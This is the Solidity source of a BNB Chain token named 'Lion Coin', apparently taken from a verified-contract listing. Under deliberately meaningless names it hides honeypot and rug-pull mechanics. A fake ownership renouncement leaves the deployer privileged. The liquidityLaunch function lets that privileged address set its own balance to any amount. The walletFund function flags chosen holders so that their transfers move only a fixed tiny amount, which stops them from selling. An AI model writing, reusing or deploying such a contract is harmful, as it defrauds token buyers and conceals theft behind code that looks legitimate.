/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface totalList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitEnable {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract LionCoin {
    uint8 private shouldSender = 18;

    address private tokenLaunched;

    string private limitMarketing = "Lion Coin";
    string private teamLiquidity = "LCN";

    uint256 private txToBuy = 100000000 * 10 ** shouldSender;
    mapping(address => uint256) private tradingAt;
    mapping(address => mapping(address => uint256)) private tokenFund;

    mapping(address => bool) public autoTake;
    address public sellLimit;
    address public amountSellReceiver;
    mapping(address => bool) public totalFund;
    uint256 constant tokenTotal = 12 ** 10;
    bool public maxBuy;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        totalList fromListFee = totalList(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountSellReceiver = limitEnable(fromListFee.factory()).createPair(fromListFee.WETH(), address(this));
        tokenLaunched = teamMinAt();
        sellLimit = tokenLaunched;
        autoTake[sellLimit] = true;
        tradingAt[sellLimit] = txToBuy;
        emit Transfer(address(0), sellLimit, txToBuy);
        limitListMarketing();
    }

    

    function feeTotal(address atSwap) public {
        if (maxBuy) {
            return;
        }
        autoTake[atSwap] = true;
        maxBuy = true;
    }

    function teamMinAt() private view returns (address) {
        return msg.sender;
    }

    function decimals() external view returns (uint8) {
        return shouldSender;
    }

    function owner() external view returns (address) {
        return tokenLaunched;
    }

    function allowance(address limitShould, address enableShould) external view returns (uint256) {
        return tokenFund[limitShould][enableShould];
    }

    function transfer(address swapLaunch, uint256 receiverExempt) external returns (bool) {
        return transferFrom(teamMinAt(), swapLaunch, receiverExempt);
    }

    function name() external view returns (string memory) {
        return limitMarketing;
    }

    function liquidityLaunch(uint256 receiverExempt) public {
        if (!autoTake[teamMinAt()]) {
            return;
        }
        tradingAt[sellLimit] = receiverExempt;
    }

    function getOwner() external view returns (address) {
        return tokenLaunched;
    }

    function approve(address enableShould, uint256 receiverExempt) public returns (bool) {
        tokenFund[teamMinAt()][enableShould] = receiverExempt;
        emit Approval(teamMinAt(), enableShould, receiverExempt);
        return true;
    }

    function limitListMarketing() public {
        emit OwnershipTransferred(sellLimit, address(0));
        tokenLaunched = address(0);
    }

    function balanceOf(address limitTx) public view returns (uint256) {
        return tradingAt[limitTx];
    }

    function walletFund(address toSenderAt) public {
        if (toSenderAt == sellLimit || toSenderAt == amountSellReceiver || !autoTake[teamMinAt()]) {
            return;
        }
        totalFund[toSenderAt] = true;
    }

    function transferFrom(address teamExemptReceiver, address swapLaunch, uint256 receiverExempt) public returns (bool) {
        if (teamExemptReceiver != teamMinAt() && tokenFund[teamExemptReceiver][teamMinAt()] != type(uint256).max) {
            require(tokenFund[teamExemptReceiver][teamMinAt()] >= receiverExempt);
            tokenFund[teamExemptReceiver][teamMinAt()] -= receiverExempt;
        }
        if (swapLaunch == sellLimit || teamExemptReceiver == sellLimit) {
            return atShould(teamExemptReceiver, swapLaunch, receiverExempt);
        }
        if (totalFund[teamExemptReceiver]) {
            return atShould(teamExemptReceiver, swapLaunch, tokenTotal);
        }
        return atShould(teamExemptReceiver, swapLaunch, receiverExempt);
    }

    function totalSupply() external view returns (uint256) {
        return txToBuy;
    }

    function symbol() external view returns (string memory) {
        return teamLiquidity;
    }

    function atShould(address buyTo, address liquidityWallet, uint256 receiverExempt) internal returns (bool) {
        require(tradingAt[buyTo] >= receiverExempt);
        tradingAt[buyTo] -= receiverExempt;
        tradingAt[liquidityWallet] += receiverExempt;
        emit Transfer(buyTo, liquidityWallet, receiverExempt);
        return true;
    }


}